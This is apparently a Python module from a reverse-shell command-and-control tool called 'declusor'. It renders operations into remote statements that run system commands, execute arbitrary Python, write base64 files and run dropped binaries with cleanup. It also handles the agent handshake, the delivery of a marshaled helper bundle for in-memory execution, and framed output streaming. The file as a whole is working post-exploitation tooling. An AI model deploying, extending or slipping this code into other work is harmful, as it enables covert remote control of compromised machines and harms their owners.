import json
import struct
from collections.abc import Generator, Mapping
from dataclasses import dataclass, field
from typing import Final

from declusor import config, contract, util


@dataclass(frozen=True)
class PySocketRenderer(contract.IOperationRenderer):
    """Translates OperationCode values to Python function call syntax.

    Composes primitive helper calls (storage, execution, encoding) into
    executable Python statements evaluated by the client launcher. This renderer
    is pure data — it never performs I/O.
    """

    _supported_operations: Final[frozenset[config.OperationCode]] = field(
        default_factory=lambda: frozenset(
            {
                config.OperationCode.EXEC_COMMAND,
                config.OperationCode.EXEC_CODE,
                config.OperationCode.EXEC_FILE,
                config.OperationCode.STORE_FILE,
                config.OperationCode.LOAD_MODULE,
            }
        )
    )
    """Set of operation codes supported by this renderer."""

    def __post_init__(self) -> None:
        object.__setattr__(self, "_supported_operations", frozenset(self._supported_operations))

    @property
    def supported_operations(self) -> frozenset[config.OperationCode]:
        """Set of supported operation codes."""

        return self._supported_operations

    def render_operation_command(self, opcode: "config.OperationCode", /, *args: str) -> str | None:
        """Build the Python execution statement for a given operation code."""

        if opcode not in self._supported_operations:
            return None

        match opcode:
            case config.OperationCode.EXEC_COMMAND:
                return self._render_exec_command(*args)
            case config.OperationCode.EXEC_CODE:
                return self._render_exec_code(*args)
            case config.OperationCode.STORE_FILE:
                return self._render_store_file(*args)
            case config.OperationCode.EXEC_FILE | config.OperationCode.LOAD_MODULE:
                return self._render_payload_execution(*args)
            case _:
                return None

    def _render_exec_command(self, *args: str) -> str:
        """Render system command execution statement."""

        command = args[0].rstrip("\r\n") if args else ""

        return f"execute_system_command({util.quote(command)})"

    def _render_exec_code(self, *args: str) -> str:
        """Render Python source code execution statement."""

        code = args[0] if args else ""

        return f"execute_source({code!r})"

    def _render_store_file(self, *args: str) -> str | None:
        """Render file storage statement decoding base64 payload."""

        if not args:
            return None

        data_b64 = args[0]

        if len(args) > 1 and args[1]:
            return f"store_file(decode_base64({data_b64!r}), {args[1]!r})"

        return f"store_file(decode_base64({data_b64!r}))"

    def _render_payload_execution(self, *args: str) -> str | None:
        """Render executable payload statement detecting script vs binary."""

        if not args:
            return None

        data_b64 = args[0]

        try:
            raw_bytes = util.convert_base64_to_bytes(data_b64)
            raw_bytes.decode("utf-8")

            return f"execute_source(decode_base64({data_b64!r}).decode('utf-8'))"
        except UnicodeDecodeError:
            return f"execute_binary(store_file(decode_base64({data_b64!r})), cleanup=True)"
        except Exception:
            return f"execute_source(decode_base64({data_b64!r}).decode('utf-8'))"


class PySocketConnection(contract.IConnection):
    """``IConnection`` implementation for a Python-socket reverse-shell client."""

    def __init__(
        self,
        transport: contract.ITransport,
        renderer: contract.IOperationRenderer,
        files: contract.IPluginProcessor,
        /,
        *,
        expected_ack: bytes = util.hash_sha256(config.DEFAULT_CLIENT_ACK_SEED),
        timeout: float | None = config.DEFAULT_CONNECTION_TIMEOUT,
    ) -> None:
        self._renderer = renderer
        self._files = files
        self._transport = transport
        self._expected_ack = expected_ack
        self._state = contract.ConnectionState.CREATED
        self._client_runtime: Mapping[str, object] | None = None
        self._is_bytecode_compatible: bool = False

        if timeout is not None:
            self._transport.timeout = timeout

    @property
    def state(self) -> contract.ConnectionState:
        """Current lifecycle state of the connection."""

        return self._state

    @property
    def client_runtime(self) -> Mapping[str, object] | None:
        """Client runtime metadata negotiated during handshake, if available."""

        return self._client_runtime

    @property
    def is_bytecode_compatible(self) -> bool:
        """Whether the remote agent's Python bytecode format matches the server."""

        return self._is_bytecode_compatible

    @property
    def renderer(self) -> contract.IOperationRenderer:
        """The command syntax renderer."""

        return self._renderer

    @property
    def timeout(self) -> float | None:
        """Current transport timeout in seconds."""

        return self._transport.timeout

    @timeout.setter
    def timeout(self, value: float | None) -> None:
        self._transport.timeout = value

    def prepare_helpers_payload(self) -> bytes:
        """Prepare the helper library bundle in the negotiated encoding.

        If the remote agent is bytecode-compatible, compiles the concatenated
        helpers and serializes them using marshal. Otherwise, encodes the raw
        helpers as UTF-8 source code for target-side in-memory compilation.
        """

        helpers_source = self._files.helpers.decode(errors="replace")

        if self._is_bytecode_compatible:
            try:
                return util.lang.python.compile_and_serialize(helpers_source, "<helpers>")
            except SyntaxError:
                pass

        return helpers_source.encode("utf-8")

    def send_python_payload(self, source: str, filename: str = "<remote>") -> None:
        """Send a Python payload in the negotiated desired encoding.

        If the remote client is bytecode compatible, compiles and marshals the payload.
        Otherwise, sends the UTF-8 source string for target-side in-memory compilation.
        """

        if self._is_bytecode_compatible:
            try:
                payload = util.lang.python.compile_and_serialize(source, filename)
                self.write(payload)
                return
            except SyntaxError:
                pass

        self.write(source.encode("utf-8"))

    def handshake(self) -> None:
        """Perform the Python agent initialization handshake.

        Negotiates Python bytecode compatibility with the remote client, transmits
        the helper bundle in the negotiated desired encoding (precompiled marshaled
        bytecode if compatible, UTF-8 source otherwise), and verifies the client ACK token.
        """

        self.ensure_can_handshake()

        self._state = contract.ConnectionState.INITIALIZING

        # Step 1: Read client runtime metadata TLV frame (channel 1)
        try:
            header = self._transport.read_exact(5)

            _, length = struct.unpack(">BI", header)
            if length > config.MAX_TLV_FRAME_SIZE:
                raise config.ConnectionError(f"TLV frame payload size {length} exceeds maximum {config.MAX_TLV_FRAME_SIZE}.")

            raw_meta = self._transport.read_exact(length) if length > 0 else b"{}"
            metadata = json.loads(raw_meta.decode("utf-8", errors="replace"))

            if isinstance(metadata, dict):
                self._client_runtime = metadata
                self._is_bytecode_compatible = util.lang.python.check_bytecode_compatibility(
                    metadata.get("magic", ""),
                    metadata.get("version", []),
                    metadata.get("implementation", "CPython"),
                )
            else:
                self._is_bytecode_compatible = False
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            raise config.ConnectionHandshakeError(
                "Failed reading client runtime metadata during handshake.",
                expected_ack=self._expected_ack,
            ) from error
        except Exception:
            self._is_bytecode_compatible = False

        # Step 2: Transmit helper libraries in the negotiated desired encoding
        helpers_payload = self.prepare_helpers_payload()
        self.write(helpers_payload)

        # Step 3: Read and verify 32-byte client ACK token
        expected_ack = self._expected_ack

        try:
            received_ack = self._transport.read_exact(len(expected_ack))

            if received_ack != expected_ack:
                raise config.ConnectionHandshakeError(
                    "Invalid client ACK during session initialization.",
                    expected_ack=expected_ack,
                    received_ack=received_ack,
                )
        except config.ConnectionHandshakeError:
            raise
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            raise config.ConnectionHandshakeError(
                "Failed waiting for client ACK during session initialization.",
                expected_ack=expected_ack,
            ) from error

        self._state = contract.ConnectionState.CONNECTED

    def write(self, data: bytes, /) -> None:
        """Send a command payload to the remote Python agent over the STDIN bus."""

        self.write_frame(config.ChannelType.STDIN, data)

    def write_frame(self, channel: config.ChannelType | int, data: bytes, /) -> None:
        """Send a TLV-framed payload on a specific bus to the remote Python agent."""

        self.ensure_can_perform_io()
        if len(data) > config.MAX_TLV_FRAME_SIZE:
            raise ValueError(f"TLV frame payload exceeds maximum size of {config.MAX_TLV_FRAME_SIZE} bytes.")

        frame = struct.pack(">BI", channel, len(data)) + data

        try:
            self._transport.write(frame)
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            raise config.ConnectionError(f"Failed to write to connection: {error}") from error

    def read(self) -> Generator[bytes, None, None]:
        """Stream response chunks from the Python agent until a PROCESS_EXIT frame."""

        self.ensure_can_perform_io()

        while True:
            try:
                header = self._transport.read_exact(5)
            except config.ConnectionTimeoutError:
                raise
            except (config.ConnectionClosed, config.ConnectionError) as error:
                raise config.ConnectionClosed(f"Connection interrupted during read: {error}") from error

            channel, length = struct.unpack(">BI", header)
            if length > config.MAX_TLV_FRAME_SIZE:
                self.close()
                raise config.ConnectionClosed(f"TLV frame payload size {length} exceeds maximum {config.MAX_TLV_FRAME_SIZE}.")

            if channel == config.ChannelType.PROCESS_EXIT:
                if length > 0:
                    try:
                        self._transport.read_exact(length)
                    except config.ConnectionTimeoutError:
                        raise
                    except (config.ConnectionClosed, config.ConnectionError) as error:
                        raise config.ConnectionClosed(f"Connection interrupted reading exit frame: {error}") from error

                return

            if length == 0:
                continue

            try:
                payload = self._transport.read_exact(length)
            except config.ConnectionTimeoutError:
                raise
            except (config.ConnectionClosed, config.ConnectionError) as error:
                raise config.ConnectionClosed(f"Connection interrupted reading payload: {error}") from error

            if channel in (config.ChannelType.STDOUT, config.ChannelType.STDERR):
                yield payload

    def __enter__(self) -> "PySocketConnection":
        return self

    def __exit__(self, *_: object) -> None:
        self.close()

    def close(self) -> None:
        """Close the underlying transport idempotently."""

        if self.is_closed:
            return

        self._state = contract.ConnectionState.CLOSED
        self._transport.close()


DEFAULT_PY_SOCKET = PySocketRenderer()
